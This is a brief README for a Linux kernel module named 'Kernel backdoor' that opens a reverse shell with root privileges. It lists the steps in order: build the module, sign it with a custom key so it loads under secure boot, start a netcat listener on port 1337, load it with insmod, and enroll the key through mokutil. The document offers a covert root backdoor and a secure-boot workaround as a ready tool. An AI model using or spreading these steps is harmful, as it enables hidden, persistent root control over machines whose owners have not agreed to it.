# Kernel backdoor

## Description

This adds a reverse shell running under userspace root

## Usage

Build:

```
make
```

Sign the module (for secure boot):

```
kmodsign sha512 ~/kernel.key ~/kernel.crt backdoor.ko
```

Start listener:

```
nc -lnvp 1337
```

Insert the module:

```
sudo insmod backdoor.ko
```

To add your cert to secure boot (done once):

```
sudo mokutil --import ~/kernel.crt
```

and reboot

